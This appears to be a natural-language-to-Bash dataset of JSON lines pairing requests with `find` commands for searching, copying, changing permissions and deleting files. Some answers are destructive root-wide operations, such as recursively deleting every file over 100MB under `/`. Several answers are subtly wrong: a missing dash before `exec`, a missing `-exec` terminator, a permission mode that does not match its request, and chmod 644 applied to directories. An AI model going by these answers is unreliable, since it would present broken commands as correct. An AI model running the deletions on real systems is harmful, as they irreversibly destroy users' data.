{"input": "Find all *.sh files owned by user vivek", "answer": "find / -user vivek -name \"*.sh\""}
{"input": "Find all *.sql file that are not newer than  $oldest_to_keep excluding the  $oldest_to_keep file", "answer": "find . -name \\*.sql -not -samefile $oldest_to_keep -not -newer $oldest_to_keep"}
{"input": "Find all *.srt files under directory named 'working' and show the first one found", "answer": "find working -type f -name \"*.srt\" | head -1"}
{"input": "Find all *.txt (case insensitive) files of user root under / directory and show a few lines of output from the beginning", "answer": "find / -user root -iname \"*.txt\" | head"}
{"input": "Find all *.txt and *.json files in current directory", "answer": "find . -type f \\( -name \"*.txt\" -o -name \"*.json\" \\)"}
{"input": "Find all *.txt file (case insensitive) in the entire system and copy them to /tmp/txt", "answer": "find / -iname '*.txt' | xargs --replace=@ cp @ /tmp/txt"}
{"input": "Find all *.txt file and replace old word to new word with sed command", "answer": "find  . -type f -name \"*.txt\" -exec sed 's/TZ/MALAWI/g' {} \\;"}
{"input": "Find all *.txt files of user Tecmint under /home directory", "answer": "find /home -user tecmint -iname \"*.txt\""}
{"input": "Find all *.txt files under / and print their sizes and paths", "answer": "find / -name '*.txt' -exec du -hc {} \\;"}
{"input": "Find all *.txt files under /foo and print their total size", "answer": "find /foo -name \"*.txt\" -exec du -hc {} + | tail -n1"}
{"input": "Find all *.txt files under current directory and copy them to ./tmp", "answer": "find . -type f -name '*.txt' | sed 's/'\"'\"'/\\'\"'\"'/g' | sed 's/.*/\"&\"/'  | xargs -I{} cp -v {} ./tmp/"}
{"input": "Find all *.txt files under current directory and print their timestamps and paths", "answer": "find . -name \"*.txt\" -printf \"%T+ %p\\n\""}
{"input": "Find all *.txt files under current directory that contains the regex 'pattern' and list them with their filenames and matches", "answer": "find . -type f -name '*.txt' -exec egrep pattern {} /dev/null \\;"}
{"input": "Find all *.txt files under current directory with their timestamps and paths, sort them and print the last entry only", "answer": "find . -name \"*.txt\" -printf \"%T+ %p\\n\" | sort | tail -1"}
{"input": "Find all *.txt files under current directory, change their permission to 666 and copy them to /dst/ directory", "answer": "find . -name \\*.txt -exec chmod 666 {} \\; -exec cp {} /dst/ \\;"}
{"input": "Find all *.txt files under the current directory whose names are not \"File.txt\"", "answer": "find . -maxdepth 1 -type f -name '*.txt' -not -name File.txt"}
{"input": "Find all *.txt files/directories in entire file system", "answer": "find / -name \"*.txt\""}
{"input": "Find all *.txt files/directories under your home directory", "answer": "find ~ -name \"*.txt\" -print"}
{"input": "Find all *.txt, *.html files under /basedir that match the case insensitive pattern *company* in their names", "answer": "find /basedir/ \\( -iname '*company*' -and \\( -iname '*.txt' -or -iname '*.html' \\) \\) -print0"}
{"input": "Find all *.xml files under current directory", "answer": "find -name *.xml"}
{"input": "Find all *bar files/directories under current directory", "answer": "find -name *bar"}
{"input": "Find all *blue* files/directories under /myfiles", "answer": "find /myfiles -name '*blue*'"}
{"input": "Find all *company* (case-insensitive) files/directories under /basedir with null character as the delimiter", "answer": "find /basedir/ -iname '*company*' -print0"}
{"input": "Find all *conf* files recursively under current directory", "answer": "find . -name *conf*"}
{"input": "Find all *fink* files/directories in entire file system", "answer": "find / -name \"*fink*\" -print"}
{"input": "Find all *fink* files/directories under current directory", "answer": "find . -name \"*fink*\" -print"}
{"input": "Find all *foo files/directories under current directory (error prone)", "answer": "find . name *foo"}
{"input": "Find all *foo* files/directories under current directory and copy them to /your/dest", "answer": "find . -name \"*foo*\" | sed -e \"s/'/\\\\\\'/g\" -e 's/\"/\\\\\"/g' -e 's/ /\\\\ /g' | xargs cp /your/dest"}
{"input": "Find all *fstab* files under and below /etc", "answer": "find /etc -name *fstab*"}
{"input": "Find all *gz files under asia and emea directory", "answer": "find asia emea -type f -name \"*gz\""}
{"input": "Find all *shp* directories under current directory and move '*' (literal) file/directory inside those directories to shp_all", "answer": "find . -name '*shp*'   -execdir mv '{}/*' shp_all ';'"}
{"input": "Find all *shp* directories under current directory and move all regular files inside those directories to ../shp_all/", "answer": "mv $(find $(find . -name \"*shp*\" -printf \"%h\\n\" | uniq) -type f) ../shp_all/"}
{"input": "Find all *shp* directories under current directory and move their contents to ../shp_all/", "answer": "mv $(find . -name \"*shp*\" -printf \"%h\\n\" | uniq)/* ../shp_all/"}
{"input": "Find all *shp* files/directories under current directory", "answer": "find . -name '*shp*'"}
{"input": "Find all *shp* files/directories under current directory and move them to ../shp_all/", "answer": "find . -name \"*shp*\" -exec mv {} ../shp_all/ \\;"}
{"input": "Find all *stat files/directories under /usr", "answer": "find /usr -name *stat"}
{"input": "Find all *text files/directories under current directory", "answer": "find -name \"*text\""}
{"input": "Find all *~ files/directories under dir and  print an rm command for each of them for deletion", "answer": "find dir -name \\*~ | xargs echo rm"}
{"input": "Find all .* files excluding list_files (case insensitive) under current directory", "answer": "find . -iname \".*\" \\! -iname 'list_files'"}
{"input": "Find all .bak files starting from the current directory and delete them", "answer": "find . -iname \"*.bak\" -type f -print | xargs /bin/rm -f"}
{"input": "Find all .c and .C files in the current directory tree that contain \"main(\" and copy them to directory test1/", "answer": "find -iname '*.c' -exec grep -l 'main(' {} \\; -a -exec cp {} test1/ \\;"}
{"input": "Find all .c and .h files in the current directory tree and search them for \"expr\"", "answer": "find -name '*.[ch]' | xargs grep -E 'expr'"}
{"input": "Find all .c, .h files in the current directory tree and search them for string \"expr\"", "answer": "find . -name '*.[ch]' | xargs grep -E 'expr'"}
{"input": "Find all .core files on the system starting from / and delete them", "answer": "find / -name \"*.core\" -print -exec rm {} \\;"}
{"input": "Find all .gif and .jpg files in the /var/www directory tree", "answer": "find /var/www -name *.gif -o -name *.jpg"}
{"input": "Find all .gif files in the /var/www directory tree that are between 5 kB and 10 kB in size", "answer": "find /var/www -name *.gif -size +5k -size -10k"}
{"input": "Find all .gz archives in the current directory tree and check if they are valid", "answer": "find \"*.gz\" -exec gunzip -vt \"{}\" +"}
{"input": "Find all .java files  under current directory", "answer": "find . -print | grep '\\.java'"}
{"input": "Find all .java files starting from the current folder", "answer": "find * -name \"*.java\""}
{"input": "Find all .java files whose name contains \"Message\"", "answer": "find . -print | grep '.*Message.*\\.java'"}
{"input": "Find all .js files in the $d directory tree whose pathnames do not contain whitespaces", "answer": "find $d -name '*.js' | grep -v \" \""}
{"input": "Find all .js files in the current directory tree that do not contain a whitespace", "answer": "find . -type f -name '*.js' \\( -exec grep -q '[[:space:]]' {} \\; -o -print \\)"}
{"input": "Find all .mp3 files starting from the current directory and delete them", "answer": "find . -type f -iname *.mp3 -delete"}
{"input": "Find all .mp3 files with more than 10MB and delete them", "answer": "find / -type f -name *.mp3 -size +10M -exec rm {} \\;"}
{"input": "Find all .mp3 files with more then 10MB and delete them from root directory ", "answer": "find /  -type f -name *.mp3 -size +10M -exec rm  {} \\;"}
{"input": "Find all .php files in all directory trees matching pattern `/srv/www/*/htdocs/system/application/' and search those files for string \"debug (\"", "answer": "find /srv/www/*/htdocs/system/application/ -name \"*.php\" -exec grep \"debug (\" {} \\; -print"}
{"input": "Find all .py files in the current directory except \"setup.py\" and those beginning with \"test_\"", "answer": "find . -maxdepth 1 -mindepth 1 \\( -name '*.py' -not -name 'test_*' -not -name 'setup.py' \\)"}
{"input": "Find all .rb and .yml files in the /some/path directory tree and replace \"some_phrase\" with \"replacement_phrase\" in them", "answer": "find /some/path -name \"*rb\" -o -name \"*yml\" | xargs grep -sl \"some_phrase\" | xargs sed -i -e 's/some_phrase/replacement_phrase/g'"}
{"input": "Find all .rpm files and change their permissions to 755", "answer": "find / -name *.rpm -exec chmod 755 '{}' \\;"}
{"input": "Find all .sh files in or below the current directory and move them to folder ~/back.scripts", "answer": "find . -name \"*.sh\" -print0 | xargs -0 -I file mv file ~/back.scripts"}
{"input": "Find all .sh files in the current directory tree and remove them", "answer": "find . -name \"*.sh\" -exec rm -rf '{}' \\"}
{"input": "Find all .sql files in the current directory recursively and print their path names separated by zeroes", "answer": "find . -name '*.sql' -print0"}
{"input": "Find all .svn directories under current directory and delete them", "answer": "find . -type d -name \".svn\" -print | xargs    rm -rf"}
{"input": "Find all .tmp files under and below the /tmp/ directory and remove them", "answer": "find /tmp -name \"*.tmp\"| xargs rm"}
{"input": "Find all .txt files except README.txt", "answer": "find . -type f -name \"*.txt\" ! -name README.txt -print"}
{"input": "Find all .txt files in current  directory and rename with  .html ", "answer": "find  . -type f -name \"*.txt\" -exec mv {} `basename {} .html` .html \\;"}
{"input": "Find all .txt files in the /home/user directory tree and copy them to /home/backup", "answer": "find /home/user -name '*.txt' | xargs cp -av --target-directory=/home/backup/ --parents"}
{"input": "Find all .txt files in the /home/user1 directory tree and copy them to /home/backup", "answer": "find /home/user1 -name '*.txt' | xargs cp -av --target-directory=/home/backup/ --parents"}
{"input": "Find all .txt files in the current directory tree and edit them with `vim'", "answer": "find . -name \"*.txt\" | xargs vim"}
{"input": "Find all .txt files in the dir/ directory tree and copy them along with times, permissions, and ownership to dir_txt/", "answer": "find dir/ -name '*.txt' | xargs cp -a --target-directory=dir_txt/ --parents"}
{"input": "Find all .txt files in the user's home directory and below", "answer": "find ~/ -name '*.txt'"}
{"input": "Find all .zip files starting from the current directory which are owned by user tommye", "answer": "find . -type f -user tommye -iname \"*.zip\""}
{"input": "Find all /home/folder1/*.txt files and create symlinks appending '_CUSTOM_TEXT.txt' in their names", "answer": "find /home/folder1/*.txt -type f | awk -F '.txt' '{printf \"ln -s %s %s_CUSTOM_TEXT.txt\\n\", $0, $1}' | sh"}
{"input": "Find all /path/to/check/* regular files without descending into any directory", "answer": "find /path/to/check/* -maxdepth 0 -type f"}
{"input": "Find all 0644 permission files/directories under current directory tree and show only the first 10 of them", "answer": "find . -perm 0644 | head"}
{"input": "Find all 1.txt, 2.txt and 3.txt files under current directory and change the permission to 444", "answer": "find . \\( -name 1.txt -o -name 2.txt -o -name 3.txt \\) -print|xargs chmod 444"}
{"input": "Find all 100MB files in file system and delete them using rm command", "answer": "find / -size +100M -exec rm -rf {} \\;"}
{"input": "Find all 100MB+ files and delete them", "answer": "find / -size +100M -exec rm -rf {} \\;"}
{"input": "Find all 15MB files", "answer": "find / -size 15M"}
{"input": "Find all 15MB files in entire file system", "answer": "find / -size 15M"}
{"input": "Find all 400 permission files under /data directory and change their permission to 755", "answer": "find /data -type f -perm 400 -print | xargs chmod 755"}
{"input": "Find all 400 permission files under /data directory and print 'Modifying ' appended with file path for each of them", "answer": "find /data -type f -perm 400 -exec echo Modifying {} \\;"}
{"input": "Find all 400 permission files under /data directory, print 'Modifying ' appended with file path for each of them and change their permission to 755", "answer": "find /data -type f -perm 400 -exec echo Modifying {} \\; -exec chmod 755 {} \\;"}
{"input": "Find all 50MB files", "answer": "find / -size 50M"}
{"input": "Find all 50MB files in file system", "answer": "find / -size 50M"}
{"input": "Find all 777 permission directories and use chmod command to set permissions to 755", "answer": "find . -type d -perm 777 -print -exec chmod 755 {} \\;"}
{"input": "Find all 777 permission directories under current directory and  set permissions to 755", "answer": "find . -type d -perm 777 -print -exec chmod 755 {} \\;"}
{"input": "Find all 777 permission files and use chmod command to set permissions to 644", "answer": "find / -type f -perm 0777 -print -exec chmod 644 {} \\;"}
{"input": "Find all 777 permission files in entire file system and set permissions to 644", "answer": "find / -type f -perm 0777 -print -exec chmod 644 {} \\;"}
{"input": "Find all 777 permission regular files and use chmod command to set permissions to 644", "answer": "find / -type f -perm 0777 -print -exec chmod 644 {} \\;"}
{"input": "Find all C source code files from the current directory tree that contain \"keyword\" in their pathnames, ignoring the case", "answer": "find . -type f \\( -iname '*.c' \\) |grep -i 'keyword'"}
{"input": "Find all CDC* files under current directory that were accessed less than 1 day ago and delete the first and last lines from those files", "answer": "find .  -type f -name \"CDC*\" -ctime -1 -exec sed -i'' -e '1d' -e '$d' '{}'  \\;"}
{"input": "Find all CDC* files under current directory that were accessed less than 1 day ago and delete the first and last lines from those files and count the number of lines in the output", "answer": "find .  -type f -name \"CDC*\" -ctime -1 -exec sed -i'' -e '1d' -e '$d' '{}'  \\ | wc -l"}
{"input": "Find all CSS files", "answer": "find . -name \"*.css\""}
{"input": "Find all ES* and FS_* files under current directory", "answer": "find . -type f \\( -iname \"ES*\" -o -iname \"FS_*\" \\)"}
{"input": "Find all Executable files", "answer": "find / -perm /a=x"}
{"input": "Find all Executable files in the file system", "answer": "find / -perm /a=x"}
{"input": "Find all HTML files starting with letter 'a' in the current directory and below", "answer": "find . -name a\\*.html"}
{"input": "Find all IP addresses in /etc directory files", "answer": "find /etc -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' {} \\;"}
{"input": "Find all MP3 files in the home directory tree that were modified in the last 24 hours", "answer": "find ~ -type f -mtime 0 -iname '*.mp3'"}
{"input": "Find all Makefile's in the current directory tree", "answer": "find -type f -name \"Makefile\""}
{"input": "Find all Makefile's in the current directory tree and look for line 235 in each of them", "answer": "find -type f -name \"Makefile\" -exec awk 'FNR==235 {print FILENAME; print}' {} +"}
{"input": "Find all Makefile's in the current directory tree and print the line 235 of each of them", "answer": "find . -type f -name Makefile -print -exec sed -n '235p' {} \\;"}
{"input": "Find all Name* files under ../../$name-module and rename them by replacing 'Name' with $Name (will be expanded in the current shell) in their names", "answer": "find ../../$name-module -print0 -name 'Name*' -type f | xargs -0 rename \"s/Name/$Name/\""}
{"input": "Find all OGG files in the home directory larger than 20 megabytes", "answer": "find $HOME -iname '*.ogg' -size +20M"}
{"input": "Find all OGG files in the home directory that are at most 20 megabytes in size", "answer": "find $HOME -iname '*.ogg' ! -size +20M"}
{"input": "Find all PHP files in the current directory recursively and search them for string \"$test\" with 8 simultaneous processes", "answer": "find . -name \\*.php -type f -print0 | xargs -0 -n1 -P8 grep -Hn '$test'"}
{"input": "Find all PHP files under current directory", "answer": "find . -type f -name *.php"}
{"input": "Find all PHP files under current directory that contain only one line", "answer": "find -name *.php -print | xargs -L1 awk 'NR>1{exit} END{if(NR==1) print FILENAME}'"}
{"input": "Find all PHP files under current directory that contain only one non-blank line", "answer": "find . -type f -name '*.php' -exec grep -Hcm2 '[^[:space:]]' {} + | sed -n '/:1$/{s///;p}'"}
{"input": "Find all PNG and JPG files and append them to archive `images.tar'", "answer": "find . \\( -iname \"*.png\" -o -iname \"*.jpg\" \\) -print -exec tar -rf images.tar {} \\;"}
{"input": "Find all Read Only files", "answer": "find / -perm /u=r"}
{"input": "Find all Read Only files in entire file system and show a few lines of output from the beginning", "answer": "find / -perm /u=r | head"}
{"input": "Find all Read Only files in the file system", "answer": "find / -perm /u=r"}
{"input": "Find all SGID files", "answer": "find / -perm /g=s"}
{"input": "Find all SGID files in entire file system", "answer": "find / -perm +2000"}
{"input": "Find all SGID set files", "answer": "find / -perm /g=s"}
{"input": "Find all SGID set files in the file system", "answer": "find / -perm /g=s"}
{"input": "Find all SGID set files under current directory and show a few lines of output from the beginning", "answer": "find . -perm /g+s | head"}
{"input": "Find all SUID files ", "answer": "find /  -perm /u=s"}
{"input": "Find all SUID files in entire file system", "answer": "find / -perm +4000"}
{"input": "Find all SUID set files", "answer": "find / -perm /u=s"}
{"input": "Find all SUID set files in the file system", "answer": "find / -perm /u=s"}
{"input": "Find all SUID set files under current directory and show a few lines of output from the beginning", "answer": "find . -perm /u=s | head"}
{"input": "Find all Subscription.java files/directories under current directory and enter into the parent directory of the first one found", "answer": "cd $(find . -name Subscription.java -printf '%h\\n')"}
{"input": "Find all TXT files in the current directory and copy them to directory \"$HOME/newdir\"", "answer": "find \"$HOME\" -name '*.txt' -type f -not -path \"$HOME/newdir/*\" -print0 | xargs -0 cp -t \"$HOME/newdir\""}
{"input": "Find all TXT files on the system and copy them to /tmp/txt", "answer": "find / -iname '*.txt' | xargs --replace=@ cp @ /tmp/txt"}
{"input": "Find all TXT files that belong to user root", "answer": "find / -user root -iname \"*.txt\""}
{"input": "Find all `doc.txt' files in the current directory tree printing \"found\" for each of them", "answer": "find ./ -name doc.txt -printf \"found\\n\""}
{"input": "Find all aliencoders.[0-9]+ files under /home/jassi/ directory", "answer": "find /home/jassi/ -type f -name \"aliencoders.[0-9]+\""}
{"input": "Find all aliencoders.[0-9]+ files/directories under /home/jassi/ directory", "answer": "find /home/jassi/ -name \"aliencoders.[0-9]+\""}
{"input": "Find all broken symlinks in maximum 1 level down the $path directory", "answer": "find -L $path -maxdepth 1 -type l"}
{"input": "Find all broken symlinks under /path/to/search directory", "answer": "find /path/to/search -type l -xtype l"}
{"input": "Find all broken symlinks under current directory", "answer": "find -L . -type l"}
{"input": "Find all build* directories under /var/www/html/ and print all but first 5 appending with the string 'rf '", "answer": "find /var/www/html/ -type d -name \"build*\" | sort | tail -n +5 | xargs -I % echo -rf %"}
{"input": "Find all catalina* files/directories under current directory", "answer": "find -name 'catalina*'"}
{"input": "Find all configration files in Home directory & Subtitute permanently in files", "answer": "find $HOME -name \"*.conf\" -exec sed -i 's/vermin/pony/g' {} \\;"}
{"input": "Find all directories and for each of them, print an mv command to move it to /new/location", "answer": "find . -type d   -execdir echo /bin/mv {} /new/location \\;"}
{"input": "Find all directories containing 'linux' in their names under '/root' directory tree", "answer": "find  /root -type d -iname \"*linux*\""}
{"input": "Find all directories in /var/www/html/zip/data/*/*/*/*/* that are older than 90 days and print only unique paths", "answer": "find /var/www/html/zip/data -type d -mtime +90 | uniq"}
{"input": "Find all directories in 1 level down the /home directory that have two consecutive vowels in their names and count them", "answer": "find /home -mindepth 1 -maxdepth 1 -type d -name '*[aeiou][aeiou]*' -printf '*' | wc -c"}
{"input": "Find all directories in entire file system which are larger than 50KB", "answer": "find / -type d -size +50k"}
{"input": "Find all directories in level 1 down the $queue directory", "answer": "echo \"$queue\" | xargs -I'{}' find {} -mindepth 1 -maxdepth 1 -type d"}
{"input": "Find all directories in maximum 1 level down the $front_element directory, sort them according to modification time and list them excluding the $front_element path from the list", "answer": "find \"$front_element\" -maxdepth 1 -type d -not -path \"$front_element\" -printf '%T@ %p\\n' | sort | awk '{print $2}'"}
{"input": "Find all directories in maximum 1 level down the current directory and remove the . entry from the output", "answer": "find . -maxdepth 1 -type d | sed '/^\\.$/d'"}
{"input": "Find all directories in maximum 1 level down the current directory that were modified less than 1 day ago", "answer": "find -maxdepth 1 -type d -mtime -1"}
{"input": "Find all directories in maximum 2 levels down the /tmp/test directory", "answer": "find /tmp/test/ -maxdepth 2 -mindepth 1 -type d"}
{"input": "Find all directories in the current directory tree excluding hidden directories and create them in \"../demo_bkp\"", "answer": "find . -not -path \\*/.\\* -type d -exec mkdir -p -- ../demo_bkp/{} \\;"}
{"input": "Find all directories in the current directory tree that are not accessible by all", "answer": "find -type d ! -perm -111"}
{"input": "Find all directories in the current directory tree that do not have `execute' permissions for anyone", "answer": "find . -type d ! -perm -111"}
{"input": "Find all directories in the current one with \"linkin park\" in their names and copy them to /Users/tommye/Desktop/LP", "answer": "find . -maxdepth 1 -type d -iname \"*linkin park*\" -exec cp -r {} /Users/tommye/Desktop/LP \\;"}
{"input": "Find all directories matching the regex '.texturedata' in their names under '/path/to/look/in/' directory tree", "answer": "find /path/to/look/in/ -type d | grep .texturedata"}
{"input": "Find all directories named \"0\" in the current directory tree and create a single tar archive of their RS* subdirectories", "answer": "find . -type d -name \"0\" -execdir tar -cvf ~/home/directoryForTransfer/filename.tar RS* \\;"}
{"input": "Find all directories named \"0\" in the current directory tree and create a tar archive of their RS* subdirectories", "answer": "find . -type d -name \"0\" -execdir tar -cvf filename.tar RS* \\;"}
{"input": "Find all directories named \"D\" in the current directory tree and print their parents", "answer": "find ./ -type d -name 'D'|sed 's/D$//'"}
{"input": "Find all directories named $1 under $HOME directory tree and remove them", "answer": "find $HOME -type d -name $1 -exec echo {} ';'  -exec rm -rf {} ';'"}
{"input": "Find all directories named 'files' under current directory and set read-write-execute permission for owner and group and no permission for other for those directories", "answer": "find . -type d -name files -exec chmod ug=rwx,o= '{}' \\;"}
{"input": "Find all directories named 'mydir' under 'local' and '/tmp' directory tree", "answer": "find local /tmp -name mydir -type d -print"}
{"input": "Find all directories named CVS, and deletes them and their contents", "answer": "find . -type d -name CVS -exec rm -r {} \\;"}
{"input": "Find all directories named postgis-2.0.0 under / directory", "answer": "sudo find / -type d -name \"postgis-2.0.0\""}
{"input": "Find all directories on the system whose size is greater than 50k", "answer": "find / -type d -size +50k"}
{"input": "Find all directories starting from / that have permissions 777", "answer": "find / -type d -perm 0777"}
{"input": "Find all directories starting from YOUR_STARTING_DIRECTORY that contain the string \"99966\" in their names", "answer": "find YOUR_STARTING_DIRECTORY -type d -name \"*99966*\" -print"}
{"input": "Find all directories that do not contain \"main.cpp\"", "answer": "diff <(find . -exec readlink -f {} \\; | sed 's/\\(.*\\)\\/.*$/\\1/' | sort | uniq) <(find . -name main.cpp  -exec readlink -f {} \\; | sed 's/\\(.*\\)\\/.*$/\\1/' | sort | uniq) | sed -n 's/< \\(.*\\)/\\1/p'"}
{"input": "Find all directories that start with stat", "answer": "find . -type d \u2013iname stat*"}
{"input": "Find all directories under $FOLDER, take the first fields (dot (.) as the delimiter) from their timestamps and reverse sort them numerically", "answer": "find \"$FOLDER\" -type d -printf \"%T@\\n\" | cut -f 1 -d . | sort -nr"}
{"input": "Find all directories under $ROOT_DIR and show the sub-directories of the directories before the directories themselves", "answer": "find $ROOT_DIR -type d -depth -print"}
{"input": "Find all directories under $d directory and set read-write-execute permission for owner and group and no permission for other for those directories", "answer": "find $d -type d -exec chmod ug=rwx,o= '{}' \\;"}
{"input": "Find all directories under $x directory and set read-write-execute permission for owner and group and no permission for other for those directories", "answer": "find ${x} -type d -exec chmod ug=rwx,o= '{}' \\;"}
{"input": "Find all directories under '.cache/chromium/Default/Cache' that are bigger than 100 MB in size excluding single letter directory names", "answer": "find .cache/chromium/Default/Cache/ -type d -print0 | du -h | grep '[0-9]\\{3\\}M' | cut -f2 | grep -v '^.$'"}
{"input": "Find all directories under '/var/www' directory tree excluding '/var/www/web-release-data' and '/var/www/web-development-data' directories and their sub-directories", "answer": "find /var/www -type d \\( ! -wholename \"/var/www/web-release-data/*\"  ! -wholename \"/var/www/web-development-data/*\" \\)"}
{"input": "Find all directories under 'A' directory tree excluding paths containing the directory 'a'", "answer": "find A -type d \\( ! -wholename \"A/a/*\" \\)"}
{"input": "Find all directories under 'project' directory without going into subdirectories that do not match the POSIX egrep regex $PATTERN in their paths and are not empty", "answer": "find project -maxdepth 1 -mindepth 1 -regextype posix-egrep ! -iregex  $PATTERN  ! -empty -type d"}
{"input": "Find all directories under 'test' directory tree that match the regex '[course*]' in their paths", "answer": "find test -regex \"[course*]\" -type d"}
{"input": "Find all directories under /directory-path and change their permission to 2755", "answer": "find /directory-path  -type d -exec sudo chmod 2775 {} +"}
{"input": "Find all directories under /home/username/public_html/modules  and set their permission to 750", "answer": "find /home/username/public_html/modules -type d -exec chmod 750 {} +"}
{"input": "Find all directories under /path whose names are 33 characters long", "answer": "find /path -type d -printf \"%f\\n\" | awk 'length==33'"}
{"input": "Find all directories under /path/to/base/cache, /path/to/base/tmp, /path/to/base/logs  and change their permission to 755", "answer": "find /path/to/base/cache /path/to/base/tmp /path/to/base/logs -type d -exec chmod 755 {} +"}
{"input": "Find all directories under /path/to/base/dir and change their permission to 755", "answer": "chmod 755 $(find /path/to/base/dir -type d)"}
{"input": "Find all directories under /path/to/dir (no sub-directories) and archive them (with relative paths) into files with .tar.gz extension", "answer": "find /path/to/dir -mindepth 1 -maxdepth 1 -type d -execdir sudo tar -zcpvf {}.tar.gz {} \\;"}
{"input": "Find all directories under /var/www/some/subset and set their SGID bit", "answer": "sudo find /var/www/some/subset -type d -print0 | xargs -0 chmod g+s"}
{"input": "Find all directories under and below directory \"folder_name\", and change their permissions to 775", "answer": "find folder_name -type d -exec chmod 775 '{}' \\;"}
{"input": "Find all directories under current directory", "answer": "find . -type d -print"}
{"input": "Find all directories under current directory and change their permission to 644", "answer": "find -type d -print0|xargs -0 chmod 644"}
{"input": "Find all directories under current directory and make them read, write, and executable for owner & group and remove read-write-execute permission for other", "answer": "find . -type d -name files -exec chmod ug+rwx,o-rwx {} \\;"}
{"input": "Find all directories under current directory and replace all null delimiters with : in the output then remove the last :", "answer": "find -type d -print0 | sed -e \"y/\\d0/:/;s/:$//;\""}
{"input": "Find all directories under current directory and set read & execute permission for group and other for these files", "answer": "find . -type d -print0 | xargs -0 chmod go+rx"}
{"input": "Find all directories under current directory and set read-write-execute permission for owner and group and no permission for other for those directories", "answer": "find . -type d -exec chmod ug=rwx,o= {} \\;"}
{"input": "Find all directories under current directory and set read-write-execute permission for owner, read-execute permission for group and execute permission for other for those directories", "answer": "find . -type d -exec chmod u=rwx,g=rx,o=x {} \\;"}
{"input": "Find all directories under current directory and set read-write-execute permission for owner, read-execute permission for group and no permission for other for those directories", "answer": "find . -type d -exec chmod u=rwx,g=rx,o= '{}' \\;"}
{"input": "Find all directories under current directory and set read-write-execute permission for owner, read-execute permission for group and other for those directories", "answer": "find . -type d -exec chmod u=rwx,g=rx,o=rx {} \\;"}
{"input": "Find all directories under current directory and set their permission to 755", "answer": "find -type d exec chmod 755 {} +"}
{"input": "Find all directories under current directory and set their permission to 775", "answer": "find -type d exec chmod 775 {} +"}
{"input": "Find all directories under current directory excluding  directories (along with their contents) that start with a . (dot) in their names", "answer": "find -type d -a ! -name '.?*' -o ! -prune"}
{"input": "Find all directories under current directory excluding those which match the regex /\\. in their names", "answer": "find . -type d | grep -v '/\\.'"}
{"input": "Find all directories under current directory having DIRNAME in their name", "answer": "find . -type d | grep DIRNAME"}
{"input": "Find all directories under current directory whose paths are 5 characters long", "answer": "find . -regextype posix-extended -type d -regex \".{5}\""}
{"input": "Find all directories under current directory with 755 permission and change their permission to 644", "answer": "find . -perm 755 -exec chmod 644 {} \\;"}
{"input": "Find all directories under dir whose names are 33 characters long", "answer": "find dir -name '?????????????????????????????????'"}
{"input": "Find all directories under foldername directory and set their permission to 755", "answer": "sudo find foldername -type d -exec chmod 755 {} \";\""}
{"input": "Find all directories under maximum 1 level down the /parent  directory and set their permission to 700 recursively", "answer": "find /parent -maxdepth 1 -type d -print0 | xargs -0 chmod -R 700"}
{"input": "Find all directories under maximum 1 level down the current directory and set their permission to 700 recursively", "answer": "find . -maxdepth 1 -type d -exec chmod -R 700 {} \\;"}
{"input": "Find all directories under media/ directory and change their permission to 700", "answer": "find media/ -type d -exec chmod 700 {} \\;"}
{"input": "Find all directories under minimum 1 level down the current directory and set their permission to 755", "answer": "find  . -type d -mindepth 1 -print -exec chmod 755 {}/* \\;"}
{"input": "Find all directories under minimum 1 level down the current directory excluding  directories (along with their contents) that start with a . (dot) in their names", "answer": "find . -mindepth 1 -name '.*' -prune -o \\( -type d -print \\)"}
{"input": "Find all directories under present working directory", "answer": "find $PWD -type d"}
{"input": "Find all directories under the current directory that is on the same filesystem, execute \"/tmp/count_em_$$\" with the directory as an argument, sort the result numerically from least value to greatest value", "answer": "find . -mount -type d -print0 | xargs -0 -n1 /tmp/count_em_$$ | sort -n"}
{"input": "Find all directories under var/ directory and change their permission to 700", "answer": "find var/ -type d -exec chmod 700 {} \\;"}
{"input": "Find all directories under ~/code excluding hidden directories and replace all newlines with : in the output then remove the last :", "answer": "find ~/code -type d -name '[^\\.]*' | tr '\\n' ':' | sed 's/:$//'"}
{"input": "Find all directories under ~/code excluding hidden directories and their subdirectories and replace all newlines with : in the output then remove the last :", "answer": "find ~/code -type d | sed '/\\/\\\\./d' | tr '\\n' ':' | sed 's/:$//'"}
{"input": "Find all directories under ~/code without descending into hidden directories and print them appended with : (colon)", "answer": "find ~/code -name '.*' -prune -o -type d -printf ':%p'"}
{"input": "Find all directories with space in their names under current directory and rename them by replacing all spaces with _", "answer": "find -name \"* *\" -type d | rename 's/ /_/g'"}
{"input": "Find all duplicate \".jar\" files in the current directory tree", "answer": "find . -type f -printf \"%f\\n\" -name \"*.jar\" | sort -f | uniq -i -d"}
{"input": "Find all empty directories in minimum 2 levels down the root directory", "answer": "find root -mindepth 2 -type d -empty"}
{"input": "Find all empty directories in the current one and delete them", "answer": "find . -type d -maxdepth 1 -empty -delete"}
{"input": "Find all empty files in the current directory and delete them", "answer": "find . -empty -maxdepth 1 -exec rm {} \\;"}
{"input": "Find all empty regular files in the current directory tree", "answer": "find . -size 0c -type f"}
{"input": "Find all executable files", "answer": "find / -perm /a=x"}
{"input": "Find all executable files under current directory and reverse sort them", "answer": "find . -perm -111 -type f | sort -r"}
{"input": "Find all executable files under current directory and show a few lines of output from the beginning", "answer": "find . -perm /a=x | head"}
{"input": "Find all executable files under the current directory and below", "answer": "find . -perm /a=x"}
{"input": "Find all executable files under {} and reverse sort them", "answer": "find {} -type f -depth 1 -perm +0111 | sort -r"}
{"input": "Find all executable symlinks or upvoter-* files under maximum 1 level down the {} directory", "answer": "find {} -name 'upvoter-*' -type f -or -type l -maxdepth 1 -perm +111"}
{"input": "Find all executable upvoter-* files (following symlinks) under maximum 1 level down the current directory", "answer": "find -L -maxdepth 1 -name 'upvoter-*' -type f -perm /111"}
{"input": "Find all executable upvoter-* files/symlinks under maximum 1 level down the {} directory", "answer": "find {} -name 'upvoter-*' \\( -type f -or -type l \\) -maxdepth 1 -perm +111"}
{"input": "Find all executables in the current directory tree", "answer": "find ./ -executable"}
{"input": "Find all executables under /path directory", "answer": "find /path -perm /ugo+x"}
{"input": "Find all file in current directory with have .c extenstion & have 777 permission . delete then", "answer": "find . -name \"*.c\" -a  -perm -777 | xargs rm -rf"}
{"input": "Find all file paths under current directory, perform a reverse numerical sort and show first 10 file paths with their status change time", "answer": "find . -type f -printf \"%C@ %p\\n\" | sort -rn | head -n 10"}
{"input": "Find all file paths under current directory, perform a reverse sort and show first 10 file paths with their status change time", "answer": "find . -type f -printf \"%C@ %p\\n\" | sort -r | head -n 10"}
